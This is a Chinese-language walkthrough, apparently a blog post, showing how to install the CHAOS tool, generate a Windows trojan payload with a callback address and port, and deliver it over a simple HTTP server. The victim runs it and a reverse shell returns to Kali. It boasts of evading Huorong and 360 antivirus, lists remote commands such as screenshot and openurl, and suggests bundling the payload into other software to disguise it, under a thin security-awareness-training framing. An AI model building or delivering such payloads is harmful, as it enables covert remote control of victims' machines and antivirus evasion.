CHAOS工具能够生成Windows 木马并且远程控制系统。

1.安装CHAOS

apt-get install golang xterm upx-ucl -y                       # 安装依赖关系



git clone https://github.com/tiagorlampert/CHAOS.git           # clone CHAOS到本地



go get github.com/kbinani/screenshot && go get github.com/lxn/win       # 获取一些第三方库


go install github.com/kbinani/screenshot && go install github.com/lxn/win              # 工具需要生成有效的payload，必须安装一些windows第三方库


切换到CHAOS目录下
go run CHAOS.go          # 运行脚本


2.生成payload并监听端口

选择一个选项:[1] Generate 生成payload

Lhost 192.168.0.33              # payload session返回的ip地址
Lport 4444                             # payload session返回的端口


最后输入payload的名称 ：hack.exe


选择是否给payload加壳


点击立即开始服务文件：会弹出一个文件运行的窗口


开始监听端口


hack.exe 就是我们生成的payload


3.将payload发送到windows主机

python -m SimpleHTTPServer    # 新建窗口开启一个http服务器将路径下的文件共享出去


mv hack.exe ../farmsec/           # 将文件移动到我们http服务器路径下面


此时我windows主机开启了火绒杀软和360杀软


访问我们的httpd服务器下载payload


4.运行payload

Windows7点击运行payload，kali返回CHAOS监听窗口


成功将windows7的shell返回到kali


5.执行操作系统命令

whoami                # 查看当前系统用户


help                   # 查看命令行的帮助文件


getos                      # 获取操作系统信息


screenshot               # 截取当前屏幕


openurl              # 浏览器打开指定的url


6.员工安全意识培训

CHAOS获取到的windows shell 权限非常高，主要是过杀软啊，O(∩_∩)O哈哈哈~在企业里给员工进行安全意识培训用这个工具就非常棒啦～（论如何科学的吓唬同事）可结合一些捆绑工具，将其他软件和CHAOS生成的payload绑定到一起，伪装的效果就更逼真了，要告诉员工不要随意下载软件和轻易点击陌生妹子发来的链接……
